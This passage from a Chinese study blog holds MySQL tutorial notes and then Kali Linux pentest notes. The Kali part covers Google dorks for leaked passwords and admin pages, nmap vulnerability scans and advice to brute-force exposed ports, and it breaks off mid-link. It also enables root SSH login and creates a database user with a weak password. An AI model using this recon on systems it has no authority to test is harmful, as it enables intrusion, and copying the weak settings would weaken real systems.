VALUES</p>\n<p>(1122,’张二丰’,’教授’,1),</p>\n<p>(1133,’宋远桥’,’副教授’,1),</p>\n<p>(1144,’杨元’,’副教授’,1),</p>\n<p>(2255,’范苑’,’教授’,2),</p>\n<p>(3366,’韦一笑’,’讲师’,3);</p>\n<p>– 插入课程数据</p>\n<p>insert into tb_course (couid,couname,coucredit,teaid) VALUES</p>\n<p>(1111,’python程序设计’,3,1122),</p>\n<p>(2222,’web前端开发’,2,1122),</p>\n<p>(3333,’操作系统’,4,1122),</p>\n<p>(4444,’计算机网络’,2,1133),</p>\n<p>(5555,’编译原理’,4,1144),</p>\n<p>(6666,’算法和数据结构’,3,1144),</p>\n<p>(7777,’经贸法语’,3,2255),</p>\n<p>(8888,’成本会计’,2,3366),</p>\n<p>(9999,’审计’,3,3366);</p>\n<p>SELECT VERSION();</p>\n<p>SELECT NOW();</p>\n<p>SELECT SYSDATE() from dual;</p>\n<p>– 插入选课数据</p>\n<p>insert into tb_score (stuid, couid, scdate, scmark) VALUES</p>\n<p>– (1001,1111,now(),95),</p>\n<p>– (1001,2222,now(),87.5),</p>\n<p>(1001,3333,now(),100),</p>\n<p>(1001,4444,now(),null),</p>\n<p>(1001,6666,now(),100),</p>\n<p>(1003,1111,now(),65),</p>\n<p>(1003,5555,now(),42),</p>\n<p>(1004,1111,now(),92.5),</p>\n<p>(1004,4444,now(),78),</p>\n<p>(1004,5555,now(),82.5),</p>\n<p>(1007,1111,now(),78),</p>\n<p>(1008,1111,now(),82),</p>\n<p>(1007,7777,now(),65.5),</p>\n<p>(1006,7777,now(),88),</p>\n<p>(1006,9999,now(),70),</p>\n<p>(1011,1111,now(),72.5),</p>\n<p>(1011,8888,now(),93),</p>\n<p>(1011,9999,now(),null);</p>\n<h2 id=\"–-CRUD操作（增删改查）\"><a href=\"#–-CRUD操作（增删改查）\" class=\"headerlink\" title=\"– CRUD操作（增删改查）\"></a>– CRUD操作（增删改查）</h2><p>– 查询所有学生信息</p>\n<p>SELECT * from tb_student;</p>\n<p>– 查询所有课程名称及学分（投影和别名）</p>\n<p>SELECT couname, coucredit from tb_course;</p>\n<p>– alias 别名：as ..</p>\n<p>SELECT couname as 课程名称, coucredit as 学分 from tb_course;</p>\n<p>SELECT stuname as 姓名, case stusex when 1 then ‘男’ else ‘女’ end as 性别 from tb_student;</p>\n<p>SELECT stuname as 姓名, if(stusex, ‘男’,’女’) as 性别 from tb_student;</p>\n<p>– 查询所有女学生的姓名和出生日期（筛选）</p>\n<p>SELECT stuname, stubirth from tb_student where stusex=0;</p>\n<p>– 查询所有80后学生的姓名、性别和出生日期（筛选）</p>\n<p>SELECT stuname, stusex, stubirth from tb_student where stubirth&gt;=’1980-1-1’ and stubirth&lt;=’1989-12-31’;</p>\n<p>SELECT stuname, stusex, stubirth from tb_student where stubirth between ‘1980-1-1’ and ‘1989-12-31’;</p>\n<p>– 查询姓’杨‘的学生姓名和性别（模糊）</p>\n<p>SELECT stuname, stusex from tb_student WHERE stuname like ‘杨%’;</p>\n<p>– 查询姓’杨‘名字两个字的学生姓名和性别（模糊）</p>\n<p>SELECT stuname, stusex from tb_student WHERE stuname like ‘杨_’;</p>\n<p>– 查询姓’杨‘名字三个字的学生姓名和性别（模糊）</p>\n<p>SELECT stuname, stusex from tb_student WHERE stuname like ‘杨__’;</p>\n<p>– 查询名字中有’不‘字或’芷‘字的学生的姓名（模糊）</p>\n<p>SELECT stuname from tb_student where stuname like ‘%不%’ or stuname like ‘%芷%’;</p>\n<p>– 查询没有录入家庭住址的学生姓名（空值）</p>\n<p>SELECT stuname from tb_student where stuaddr is null;</p>\n<p>– 查询录入了家庭住址的学生姓名（空值）</p>\n<p>SELECT stuname from tb_student where stuaddr is not null;</p>\n<p>– 查询学生选课的所有日期（去重）</p>\n<p>SELECT DISTINCT scdate from tb_score;</p>\n<p>– 查询学生的家庭住址（去重）</p>\n<p>SELECT DISTINCT stuaddr from tb_student where stuaddr is not null;</p>\n<p>– 查询男学生的姓名和生日按年龄从大到小排序（排序）</p>\n<p>– asc - ascending - 升序（从小到大）</p>\n<p>– desc - descending - 降序（从大到小）</p>\n<p>SELECT stuname, year(NOW()) - year(stubirth) as 年龄 from tb_student where stusex=1 ORDER BY 年龄 desc;</p>\n<p>– 聚合函数 max / min / count / sum / avg (忽略空值)</p>\n<p>– 查询年龄最大的学生的出生日期（聚合函数）</p>\n<p>SELECT min(stubirth) from tb_student;</p>\n<p>– 查询年龄最小的学生的出生日期（聚合函数）</p>\n<p>SELECT max(stubirth) from tb_student;</p>\n<p>– 查询男女学生的人数（分组和聚合函数）</p>\n<p>SELECT count(stuid) from tb_student;</p>\n<p>SELECT stusex, count(*) from tb_student group by stusex;</p>\n<p>SELECT stusex, min(stubirth) from tb_student group by stusex;</p>\n<p>– 查询课程编号为1111的课程的平均成绩（筛选和聚合函数）</p>\n<p>SELECT avg(scmark) from tb_score where couid=1111;</p>\n<p>SELECT min(scmark) from tb_score where couid=1111;</p>\n<p>SELECT count(scmark) from tb_score where couid=1111;</p>\n<p>SELECT count(scid) from tb_score where couid=1111;</p>\n<p>– 查询学号为1001的学生所有课程的平均分（筛选和聚合函数）</p>\n<p>SELECT avg(scmark) from tb_score where stuid=1001;</p>\n<p>– 查询每个学生的学号和平均成绩（分组和聚合函数）</p>\n<p>SELECT stuid, avg(scmark) from tb_score group by stuid;</p>\n<p>– 查询平均成绩大于等于90分的学生的学号和平均成绩</p>\n<p>– 分组以前的筛选使用where子句，分组以后的筛选使用having子句</p>\n<p>SELECT stuid, avg(scmark) as 平均分 from tb_score group by stuid HAVING 平均分&gt;=90;</p>\n<p>– 查询年龄最大的学生的姓名（子查询/嵌套查询）</p>\n<p>SELECT stuname from tb_student where stubirth=(</p>\n<p>SELECT min(stubirth) from tb_student);</p>\n<p>– 查询年龄最大的学生的姓名和年龄（子查询+运算）</p>\n<p>SELECT stuname,year(now())-year(stubirth) as 年龄 from tb_student where stubirth=(</p>\n<p>SELECT min(stubirth) from tb_student);</p>\n<p>– 查询选了两门以上的课程的学生姓名（子查询/分组条件/集合运算）</p>\n<p>SELECT stuname from tb_student where stuid in (</p>\n<p>SELECT stuid from tb_score GROUP BY stuid having count(stuid)&gt;2);</p>\n<p>– 查询学生姓名、课程名称以及成绩（连接查询）</p>\n<p>– 笛卡尔积</p>\n<p>SELECT stuname, couname,scmark from tb_student t1,tb_course t2,tb_score t3 </p>\n<p>where t1.stuid=t3.stuid and t2.couid=t3.couid and scmark is not null;</p>\n<p>SELECT stuname, couname,scmark from tb_student t1 inner join tb_score t3 on t1.stuid=t3.stuid inner join tb_course t2 on t2.couid=t3.couid where scmark is not null order by scmark desc limit 5 offset 10;</p>\n<p>– 分页查询（limit 5 offset 10 / limit 10,5）：跳过10条信息查询5条信息</p>\n<p>SELECT stuname, couname,scmark from tb_student t1 inner join tb_score t3 on t1.stuid=t3.stuid inner join tb_course t2 on t2.couid=t3.couid where scmark is not null order by scmark desc limit 10,5;</p>\n<p>– 单表：65535TB</p>\n<p>– 单列：4G - LONGBLOB(Binary Large OBject) / LONGTEXT</p>\n<p>– 查询选课学生的姓名和平均成绩（子查询和连接查询）</p>\n<p>select stuname,avgmark from tb_student t1,</p>\n<p>(SELECT stuid, avg(scmark) as avgmark from tb_score group by stuid) t2 where t1.stuid=t2.stuid;</p>\n<p>– 内连接（inner join）</p>\n<p>select stuname,avgmark from tb_student t1 inner join</p>\n<p>(SELECT stuid, avg(scmark) as avgmark from tb_score group by stuid) t2 on t1.stuid=t2.stuid;</p>\n<p>– 外连接（outer join）：左外连接-left outer join/右外连接-right outer join/全外连接-full outer join</p>\n<p>– 查询每个学生的姓名和选课数量（左外连接和子查询）</p>\n<p>– 左外连接：对left outer join关键词左边的查询结果（左表）做完全查询，即使不满足附加条件</p>\n<p>SELECT stuname, ifnull(total,0) from tb_student t1 left outer join</p>\n<p>(SELECT stuid,count(stuid) as total from tb_score group by stuid) t2 on t1.stuid=t2.stuid;</p>\n<h2 id=\"–-注意事项\"><a href=\"#–-注意事项\" class=\"headerlink\" title=\"– 注意事项\"></a>– 注意事项</h2><p>– 1. 给数据库和表命名的时候尽量使用全小写</p>\n<p>– 2. 作为筛选条件的字符串是否区分大小写看设置的校对规则</p>\n<p>– select … where name = ‘jack’;</p>\n<p>– CREATE DATABASE school DEFAULT charset utf8 collate utf8_general_ci;</p>\n<p>– 3. 数据库中的对象通常会用前缀加以区分</p>\n<p>– table/view/index/function/procedure/trigger</p>\n<p>– 4. 向表中添加列并指定位置</p>\n<p>– ALTER TABLE tb_college ADD COLUMN colmaster VARCHAR (255) after/first colname;</p>\n<p>– 5. 通常不推荐使用in或者not in集合运算和distinct去重操作，可以用exists或not exists替代掉集合运算和去重操作。</p>\n<p>– 查询姓’杨‘的学生（模糊）</p>\n<p>– SELECT ‘x’ from dual where exists (select * from tb_student WHERE stuname like ‘杨%’);</p>\n<p>– SELECT ‘x’ from dual where exists (select stuid from tb_student WHERE stuname like ‘李%’);</p>\n<p>– 6. 生成执行计划explain判断性能和效率（正向查询，主键查询）</p>\n<p>– SELECT stuname, stuid from tb_student where stuid=1001;</p>\n<p>– SELECT stuname, stuid from tb_student where stuname=’张三丰’;</p>\n<p>– 7. 创建索引提高性能（负向查询无效，模糊查询%在前无效）</p>\n<p>– 索引可以加速查询所以应该在经常用于查询筛选条件的列上建立索引</p>\n<p>– 索引会使用额外的存储空间而且会让增删改变得更慢（因为要更新索引），不能滥用</p>\n<p>– creat index idx_student_stuname on tb_student (stuname);</p>\n<p>– drop index idx_student_stuname on tb_student;</p>\n<p>– 8. 视图：查询的快照</p>\n<p>– 通过视图可以将用户的访问权限限制到某些指定的列上</p>\n<p>create view vw_stu_col as</p>\n<p>SELECT stuid, stuname, colname from tb_student t1 inner join tb_college t2 on t1.colid=t2.colid;</p>\n<p>select * from vw_stu_col;</p>\n<p>select stuname,colname from vw_stu_col;</p>\n<p>drop view vw_stu_col;</p>\n<p>– 9.（存储）过程/函数：把一系列的SQL可以封装到一个过程中，而且可以加上分支和循环，将来通过过程的名字直接调用过程即可，因为创建过程时已经提前编译了SQL语句，所以比直接执行SQL语句性能更好。</p>\n<p>– 重新定义定界符为$$(默认定界符”;” “\\g”)</p>\n<p>delimiter $$</p>\n<p>– 创建存储过程</p>\n<p>create procedure sp_cou_avg_scmark(in id int, out avgscmark float) </p>\n<p>begin </p>\n<p>select avg(scmark) into avgscmark from tb_score where couid=id; </p>\n<p>end$$</p>\n<p>– 将定界符还原回;</p>\n<p>delimiter ;</p>\n<p>– 调用存储过程</p>\n<p>call sp_cou_avg_scmark(2222, @m);</p>\n<p>– 通过输出参数取出学院平均成绩</p>\n<p>select @m;</p>\n<p>– 删除存储过程</p>\n<p>drop procedure sp_col_avg_score;</p>\n<p>– 触发器：(一般不用)在执行增删改操作时可以触发其他的级联操作，但是有可能导致“锁表”现象，实际开发中应该尽量避免使用触发器</p>\n<p>delete from tb_course where couid=1111;</p>\n<p>update tb_course set couid=1010 where couid=1111;</p>\n<p>delimiter $$</p>\n<p>create trigger tr_course_update</p>\n<p>after update on tb_course for each row</p>\n<p>begin</p>\n<p>​    update tb_student set couid=new.couid where couid=old.couid;</p>\n<p>end$$</p>\n<p>delimiter ;</p>\n<p>drop trigger tr_course_update;</p>\n<h2 id=\"–-DCL-授予权限（grant-to）和召回权限-revoke-from\"><a href=\"#–-DCL-授予权限（grant-to）和召回权限-revoke-from\" class=\"headerlink\" title=\"– DCL: 授予权限（grant to）和召回权限(revoke from)\"></a>– DCL: 授予权限（grant to）和召回权限(revoke from)</h2><p>create user ‘hellokitty‘@’%’ identified by ‘123123’;</p>\n<p>grant all privileges on school.* to ‘hellokitty‘@’%’;</p>\n<p>revoke insert, delete, update on school.* from ‘hellokitty‘@’%’;</p>\n<p>– drop user ‘hellokitty‘@’%’;</p>\n<h2 id=\"–-事务（transaction）-把多个增删改的操作做成不可分割的原子性操作\"><a href=\"#–-事务（transaction）-把多个增删改的操作做成不可分割的原子性操作\" class=\"headerlink\" title=\"– 事务（transaction）- 把多个增删改的操作做成不可分割的原子性操作\"></a>– 事务（transaction）- 把多个增删改的操作做成不可分割的原子性操作</h2><p>– 要么全部都做，要么全都不做</p>\n<p>– start tansaction;</p>\n<p>begin;</p>\n<p>delete from tb_student;</p>\n<p>– 提交（事务中的所有操作全都生效）</p>\n<p>commit;</p>\n<p>– 回滚（事务中的所有操作全部撤销）</p>\n<p>rollback;</p>\n<p>CREATE TABLE products (</p>\n<p>id int auto_increment comment ‘编号’,</p>\n<p>num INT NOT NULL COMMENT ‘商品编号’,</p>\n<p>pname VARCHAR (20) NOT NULL COMMENT ‘品名’,</p>\n<p>price INT NOT NULL COMMENT ‘价格’,</p>\n<p>数量quantity INT NOT NULL COMMENT ‘数量’,</p>\n<p>);</p>\n","categories":["数据库"],"tags":["基础"]},{"title":"kali-linux","url":"/2022/08/17/kali-Linux/","content":"<h1 id=\"kali-Linux-环境安装\"><a href=\"#kali-Linux-环境安装\" class=\"headerlink\" title=\"kali Linux_环境安装\"></a>kali Linux_环境安装</h1><h2 id=\"Kali-系统更新\"><a href=\"#Kali-系统更新\" class=\"headerlink\" title=\"Kali****系统更新\"></a><strong>Kali****系统更新</strong></h2><p>——选择不更新Metasploit</p>\n<p>\\1.  查看当前系统中所有软件包状态</p>\n<p>sudo dpkg -get-selections | more</p>\n<p>可以找到metasploit-framework软件包名为“Metasploit-framework”</p>\n<p>\\2.  给metasploit-framework锁定当前版本不更新</p>\n<p>sudo apt-mark hold Metasploit-framework</p>\n<p>\\3.  查看当前已锁定的软件包</p>\n<p>sudo dpkg –get-selections | grep hold</p>\n<p>\\4.  取消软件保留设置</p>\n<p>sudo apt-mark unhold Metasploit-framework</p>\n<p>——kali系统更新后出现的问题</p>\n<p>​    进入/usr/share/Metasploit-framework   目录下使用命令</p>\n<p>​    gem install bundler</p>\n<p>​    gem update –system</p>\n<p>​    然后成功启动</p>\n<h2 id=\"SSH-系统服务\"><a href=\"#SSH-系统服务\" class=\"headerlink\" title=\"SSH****系统服务\"></a><strong>SSH****系统服务</strong></h2><p>——SSH服务简介：</p>\n<p>​    SSH服务是目前较可靠，专为远程登录服务器和其他网络服务提供安全性的协议。</p>\n<p>​    SSH是标准的网络协议，可用于大多数UNIX操作系统，能够实现字符界面的远程登陆管理，它默认使用22号端口，采用密文的形式在网络中传输数据，相对于通过明文传输的Telnet，具有更高的安全性。</p>\n<p>​    SSH提供了口令和密钥两种用户验证方式，这两者都是通过密文传输数据的。</p>\n<p>​    SSH对我们的主要作用是：能够操作远程服务器系统。</p>\n<p>——配置流程</p>\n<p>1.使用编辑器打开ssh配置</p>\n<p>leafpad /etc/ssh/ssh_config</p>\n<p>​    搜索：</p>\n<p>​        #PasswordAuthentication yes                     (去掉注释)</p>\n<p>​       #PermitRootLogin prohibit-password              （去掉注释后面的并删除改为yes）</p>\n<p>​    2.使用命令行模式开启SSH服务</p>\n<p>​       service ssh start</p>\n<p>​    3.查看服务开启状态</p>\n<p>​       service ssh status</p>\n<p>\\5.  登录测试</p>\n<p>使用xshell、putty等工具测试</p>\n<h2 id=\"Kali-工具包简介\"><a href=\"#Kali-工具包简介\" class=\"headerlink\" title=\"Kali****工具包简介\"></a><strong>Kali****工具包简介</strong></h2><p>kali Linux含有可用于渗透测试的各种工具，这些工具程序大体可以分为以下几类。</p>\n<p>\\1.  信息收集：这类工具主要用来帮助我们收集目标的网络架构、网站脚本语言、网站信息泄露等。</p>\n<p>\\2.  漏洞评估：这类工具都可以扫描目标系统上的漏洞，扫描主机漏洞，系统漏洞。</p>\n<p>\\3.  漏洞利用：这类工具可以利用在目标系统中发现的漏洞，让我们针对性的去利用攻击。</p>\n<p>\\4.  Web应用：即与Web应用有关的工具，关于web方面的扫描器、爆破等工具</p>\n<p>\\5.  密码攻击：提供在线密码破解或者是离线的密码破解工具给我们使用</p>\n<h2 id=\"什么是shell\"><a href=\"#什么是shell\" class=\"headerlink\" title=\"什么是shell\"></a><strong>什么是shell</strong></h2><p>——了解什么是shell</p>\n<p>​    在计算机科学中，shell俗称外壳（用来区别于内核），它类似于windows的DOS，能够接收用户的命令并翻译给操作系统执行，是用户与操作系统（内核）之间的桥梁。</p>\n<p>​    查看系统支持哪些shell:</p>\n<p>​       cat /etc/shells</p>\n<p>​    查看正在使用的shell:</p>\n<p>​       echo $SHELL</p>\n<p>​    shell与终端的区别：</p>\n<p>​       终端：接收用户的输入，并传递给shell程序，接收程序输出并展示到屏幕.</p>\n<p>shell：接收并解析用户的命令给操作系统执行，将结果输出到终端。</p>\n<h2 id=\"vim-编辑器\"><a href=\"#vim-编辑器\" class=\"headerlink\" title=\"vim****编辑器\"></a><strong>vim****编辑器</strong></h2><p>——vi/vim编辑器模式</p>\n<p>​    命令模式（默认）：刚进入vim的时候，默认就是命令模式，可以复制行删除行等。</p>\n<p>​    输入模式：可以输入内容。</p>\n<p>——模式转换</p>\n<p>​    使用insert键切换进入输入模式：命令模式à输入模式</p>\n<p>​    i：在当前光标所在字符的前面，转为输入模式</p>\n<p>​    I：在当前光标所在行的行首转换为输入模式</p>\n<p>​    a：在当前光标所在字符的后面，转换为输入模式</p>\n<p>​    A：在光标所在行的行尾，转换为输入模式</p>\n<p>​    o：在当前光标所在行的下方，新建一行，并转换为输入模式</p>\n<p>​    O：在当前光标所在行的上方，新建一行，并转换为输入模式</p>\n<p>​    s：删除光标所在字符</p>\n<p>​    r：替换光标处字符</p>\n<p>——键入模式à命令模式</p>\n<p>​    ESC键</p>\n<p>——关闭保存文件</p>\n<p>​    shift键+:号</p>\n<p>​    命令模式下：</p>\n<p>​    w：保存</p>\n<p>​    q：退出</p>\n<p>​    wq和x都是保存退出</p>\n<p>​    q!：强制退出</p>\n<p>​    w!：强制保存，管理员才有权限</p>\n<p>——查找</p>\n<p>​    普通模式：</p>\n<p>​    /PATTERN：从当前位置向后查找</p>\n<p>​    ? PATTERN：从当前位置向前查找</p>\n<h2 id=\"Linux-常用命令\"><a href=\"#Linux-常用命令\" class=\"headerlink\" title=\"Linux****常用命令\"></a><strong>Linux****常用命令</strong></h2><p><strong>查找Linux命令：<a href=\"http://linux.51yip.com/\">http://linux.51yip.com/</a></strong></p>\n<p>echo命令：</p>\n<p>​    echo命令用于在终端输出字符串或变量提取后的值，格式为“echo [字符串 | $变量]”。</p>\n<p>date命令：</p>\n<p>​    date命令用于显示及设置系统的时间或日，格式为“date [] [+指定的格式]”。</p>\n<p>poweroff命令：</p>\n<p>​    poweroff命令用于关闭系统，其格式为poweroff。</p>\n<p>top命令：</p>\n<p>​    显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率等，格式为“top [参数]”。</p>\n<p>​    ifconfig命令：</p>\n<p>​       用于获取网卡配置与网络状态等信息，格式为“ifconfig [网络设备] [参数]”</p>\n<p>​    uname命令：</p>\n<p>​       用于查看系统内核与系统版本等信息，格式为“uname [-a]“</p>\n<p>​    who命令：</p>\n<p>​       用于查看当前登入主机的用户终端信息，格式为“who [参数]“</p>\n<p>​    history命令：</p>\n<p>​       用于显示历史执行过的命令就，格式为“history [数值]“</p>\n<p>​    pwd命令：</p>\n<p>​       用于显示用户当前所处的工作目录，格式为“pwd [选项]“</p>\n<p>​    cat命令：</p>\n<p>​       用于查看纯文本文件（内容较少的），格式为“cat [选项] [文件]”</p>\n<p>​    more命令：</p>\n<p>​       用于查看纯文本文件（内容较多的），格式为“more [选项]文件”</p>\n<p>​    head命令：</p>\n<p>​       用于查看纯文本文档的前N行，格式为“head [选项] [文件]”</p>\n<p>​    wc命令：</p>\n<p>​       用于统计指定文本的行数、字数、字节数，格式为“wc [选项] 文本”</p>\n<p>​    stat命令：</p>\n<p>​       用于查看文件的具体存储信息和时间等信息，格式为“stat 文件名称”</p>\n<p>​    touch命令：</p>\n<p>​       用于创建空白文件或设置文件的时间，格式为“touch [选项] [文件]”</p>\n<p>​    mkdir命令：</p>\n<p>​       用于创建空白的目录，格式为“mkdir [选项] 目录”</p>\n<p>​    mv命令：</p>\n<p>​       用于移动文件或将文件重命名，格式为“mv [选项] 源文件 [目标路径|目标文件名]”</p>\n<p>​    file命令：</p>\n<p>​       用于查看文件的类型，格式为“file 文件名”</p>\n<p>——使用chmod命令进行文件的权限修改</p>\n<p>​    chmod [选项] &lt;模式，模式…&gt; &lt;文件名…&gt;</p>\n<p>​    文件和目录的权限：linux的文件和目录的权限有所不同。</p>\n<p>​    文件的权限：</p>\n<p>​    r 读文件   数值为4</p>\n<p>​    w 写文件  数值为2</p>\n<p>​    x 执行文件 数值为1</p>\n<p>​    目录的权限：</p>\n<p>​    x r 可以读取（cp）和查看（ls）目录的内容（即文件和目录），同时还需要可执行权限。</p>\n<p>​    x w 可以在目录里创建文件（touch）与目录（mkdir）还有删除文件（rm）与目录（rmdir），同时还需要可执行权限。</p>\n<p>​    x x 可以进入目录（cd）和执行文件 实践过程</p>\n<p>Linux文件权限和目录配置：<a href=\"http://cn.linux.vbird.org/linux_basic/0210filepermission.php\">http://cn.linux.vbird.org/linux_basic/0210filepermission.php</a></p>\n<p>用户管理：<a href=\"https://www.cnblogs.com/xd502djj/archive/2011/11/23/2260094.html\">https://www.cnblogs.com/xd502djj/archive/2011/11/23/2260094.html</a></p>\n<p>github项目克隆到本地：git clone [github克隆链接]</p>\n<p>——查看用户信息：cat /etc/passwd</p>\n<p>​    添加用户：useradd -m 用户名  自动在home文件夹下创建用户名的目录。</p>\n<p>​             useradd -g 组名 用户名    指定添加在某个组里。</p>\n<p>​             passwd 用户名     修改key的新密码</p>\n<p>​    删除用户：userdel -r 用户名    删除目录以及用户</p>\n<p>​    查看用户组信息：cat /etc/group</p>\n<p>​    查看用户组归属：groups 用户名</p>\n<p>​    添加组：usermod -g 组名 用户名</p>\n<p>​            usermod -a-G 组名 用户名</p>\n<p>​    删除组：groupdel 组名</p>\n<p>​    设置权限：chmod 777 文件名     给当前文件设置为777权限</p>\n<p>​             chmod -R 777目录名    给当前目录递归权限为777</p>\n<p>​    小游戏：<a href=\"https://linuxz.github.io/tianyizone/linux-chmod-permissions.html\">https://linuxz.github.io/tianyizone/linux-chmod-permissions.html</a></p>\n<p>——软件安装管理</p>\n<p>​    dpkg：dpkg是一个Debian的一个命令行工具，它可以用来安装、删除、构建和管理Debian的软件包。</p>\n<p>​           安装软件：dpkg -I xxx.deb</p>\n<p>​           卸载软件：dpkg -r xxx.deb 删除软件包</p>\n<p>​                    dpkg -r –purge xxx.deb  连同配置文件一起删除</p>\n<p>​    gdebi：gdebi是一个轻量级的deb安装工具，它能代替臃肿的ubuntu软件中心安装deb.</p>\n<p>​           安装gdebi：sudo apt-get update</p>\n<p>​                      sudo apt-get install gdebi</p>\n<p>​           安装软件：sudo gdebi xxx.deb</p>\n<p>​                     图形化安装</p>\n<p>——搜索命令：find命令 所查找的目录路径</p>\n<p>​              find  ./kali/ -print 指定目录查找并输出</p>\n<p>​              find ./kali/ -exec ls () ; 指定目录以shell脚本运行并输出</p>\n<p><a href=\"https://blog.csdn.net/WX_East/article/details/68530883\">https://blog.csdn.net/WX_East/article/details/68530883</a></p>\n<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><h2 id=\"信息收集什么\"><a href=\"#信息收集什么\" class=\"headerlink\" title=\"信息收集什么\"></a>信息收集什么</h2><p>目标人物：电话、邮箱、密码、whois……. <a href=\"http://tool.chinaz.com/\">http://tool.chinaz.com/</a></p>\n<p>目标环境：域名、脚本语言、数据库、中间件、框架、cms、开放端口……</p>\n<p>目标事件：历史漏洞、使用手册、使用说明、通知、公众号……</p>\n<p>社工密码字典在线生成：<a href=\"https://api.xiaobaibk.com/lab/guess/\">https://api.xiaobaibk.com/lab/guess/</a></p>\n<h2 id=\"信息收集能干嘛\"><a href=\"#信息收集能干嘛\" class=\"headerlink\" title=\"信息收集能干嘛\"></a>信息收集能干嘛</h2><p>例子1：cms可能存在通杀漏洞，如果使用了CMS建站我们可以用通杀漏洞直接攻击。</p>\n<p>例子2：有些危险端口开放了我们就可以尝试入侵，例如445|3306|22|1433|6379可以尝试爆破或者使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表不同的web网站。</p>\n<h2 id=\"信息收集报告编写\"><a href=\"#信息收集报告编写\" class=\"headerlink\" title=\"信息收集报告编写\"></a>信息收集报告编写</h2><p>记录收集到的信息</p>\n<p>目标人物：电话、邮箱、密码、whois……. </p>\n<p>目标环境：域名、脚本语言、数据库、中间件、框架、cms、开放端口……</p>\n<p>目标事件：历史漏洞、使用手册、使用说明、通知、公众号、手机app……</p>\n<h2 id=\"谷歌语法Google-hacking\"><a href=\"#谷歌语法Google-hacking\" class=\"headerlink\" title=\"谷歌语法Google hacking\"></a>谷歌语法Google hacking</h2><p>——传统的搜索引擎能够有效抓取对方网站页面内容</p>\n<p>\\1.  公司动态；2.组织文档；3.用户名/密码；4.测试文件；5.历史数据</p>\n<p>——常见的谷歌语法帮助我们缩小目标搜索范围</p>\n<p>site：搜索范围限制在某网站或顶级域名中。</p>\n<p>inurl：当我们用inurl进行查询的时候，google会返回哪些在URL（网址）里边包含了我们查询关键词的网页。</p>\n<p>intext：当我们用intext进行查询的时候，google会返回那些在文本正文里边包含了我们查询关键词的网页。</p>\n<p>intitle：当我们用intitle进行查询的时候，google会返回哪些网页标题为查询结果。</p>\n<p>google镜像：<a href=\"https://www.ggjxz.top/\">https://www.ggjxz.top/</a></p>\n<p>​              <a href=\"https://gg456.top/\">https://gg456.top/</a></p>\n<p>​              <a href=\"http://tools.bugscaner.com/google/\">http://tools.bugscaner.com/google/</a></p>\n<p><a href=\"https://go-xyz.xyz/\">https://go-xyz.xyz/</a></p>\n<p>google语法例子：</p>\n<p>​    intitle:”netbotz appliance” “ok”</p>\n<p>​    inurl: /admin/login.php</p>\n<p>inur:qq.txt</p>\n<p>filetype:xls “username | password”</p>\n<p>intext:password “Login Info” filetype:txt</p>\n<p>扩展思路：<a href=\"https://www.exploit-db.com/google-hacking-database\">https://www.exploit-db.com/google-hacking-database</a></p>\n<p><a href=\"https://www.baidu.com/robots.txt\">https://www.baidu.com/robots.txt</a> 爬虫协议</p>\n<h2 id=\"网络空间搜索引擎\"><a href=\"#网络空间搜索引擎\" class=\"headerlink\" title=\"网络空间搜索引擎\"></a>网络空间搜索引擎</h2><p>——基于物联网搜索，搜索联网的网络设备</p>\n<p>钟馗之眼：<a href=\"http://www.zoomeye.org/\">http://www.zoomeye.org</a>    傻蛋：<a href=\"https://www.oshadan.com/\">https://www.oshadan.com</a></p>\n<p>Shodan：<a href=\"https://www.shodan.io/\">https://www.shodan.io</a>       Dnsdb：<a href=\"https://www.dnsdb.io/zh-cn/\">https://www.dnsdb.io/zh-cn/</a></p>\n<p>fofa：<a href=\"https://fofa.so/\">https://fofa.so</a></p>\n<h2 id=\"端口扫描-Nmap\"><a href=\"#端口扫描-Nmap\" class=\"headerlink\" title=\"端口扫描-Nmap\"></a>端口扫描-Nmap</h2><p>——功能：</p>\n<p>1.检测存活在网络上的主机（主机发现）</p>\n<p>\\2.  检测主机上开放的端口（端口发现或枚举）</p>\n<p>\\3.  检测到相应的端口（服务发现）的软件和版本</p>\n<p>\\4.  检测操作系统，硬件地址，以及软件版本</p>\n<p>\\5.  检测脆弱性的漏洞（Nmap的脚本）</p>\n<p>——常用的端口扫描指令</p>\n<p>​    -sS：TCP SYN扫描</p>\n<p>​    -p：指定端口号扫描</p>\n<p>​    -v：显示扫描过程</p>\n<p>​    -F：快速扫描</p>\n<p>​    -Pn：禁止ping后扫描：跳过主机发现的过程进行端口扫描</p>\n<p>​    -A：全面的系统扫描：包括打开操作系统探测、版本探测、脚本扫描</p>\n<p>—扫描指定ip开放端口</p>\n<p>​    命令：nmap -sS -p 端口号 -v 192.168.1.2</p>\n<p>​    使用半开扫描，指定端口号1-65535，显示扫描过程</p>\n<p>—穿透防火墙扫描</p>\n<p>​    命令：nmap -Pn -A 192.168.1.2</p>\n<p>​    服务器禁止ping命令，试试-Pn，nmap参数配合使用</p>\n<p>​    -sU：UDP扫描                         -sT：TCP扫描</p>\n<p>​    -sV：扫描系统和程序版本号检测          –script=vuln：全面的漏洞扫描</p>\n<p>​    -n：禁止反向域名解析                   -R：反向域名解析</p>\n<p>​    -6：启用IPV6扫描</p>\n<p>​    —漏洞扫描</p>\n<p>​    nmap -script=vuln 192.168.1.2</p>\n<p>​    使用vuln脚本进行全面的漏洞扫描</p>\n<p>​    信息安全漏洞门户：<a href=\"http://cve.scap.org.cn/\">http://cve.scap.org.cn/</a></p>\n<p>​                     <a href=\"https://cve.mitre.org/\">https://cve.mitre.org/</a></p>\n<p>—指纹识别扫描</p>\n<p>​    nmap -sV -v 192.168.1.2</p>\n<p>​    扫描系统和程序版本号检测，并且输出详细信息。</p>\n<p>——端口扫描的状态</p>\n<p>​    opened：端口开启                          closed：端口关闭</p>\n<p>​    Filtered：端口被过滤，数据没有到达主机，返回的结果为空，数据被防火墙</p>\n<p>​    Unfiltered：未被过滤，数据有到达主机，但是不能识别端口的当前状态</p>\n<p>​    open|filtered：开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中。</p>\n<p>​    close|filtered：关闭或者被过滤，只发生在IP ID idle扫描。</p>\n<p>——使用Nmap中的脚本进行信息收集</p>\n<p>​    —whois信息查询</p>\n<p>​    —DNS解析查询</p>\n<p>——Nmap中的漏洞脚本扫描</p>\n<p>​    Nmap官方脚本：<a href=\"https://svn.nmap.org/nmap/scripts/\">https://svn.nmap.org/nmap/scripts/</a></p>\n<p>​    Nmap中文手册：<a 